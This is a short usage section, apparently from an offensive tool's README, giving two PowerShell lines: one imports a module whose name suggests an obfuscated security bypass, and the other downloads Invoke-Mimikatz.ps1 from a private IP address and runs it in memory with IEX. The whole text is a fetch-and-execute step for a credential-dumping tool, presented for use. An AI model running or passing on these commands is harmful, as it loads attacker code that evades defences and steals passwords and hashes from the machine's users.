# USAGE

```powershell
Import-Module .\bypass-E_FAIL-xored.ps1
(New-Object Net.WebClient).DownloadString('http://10.10.15.180/Invoke-Mimikatz.ps1') | IEX;
```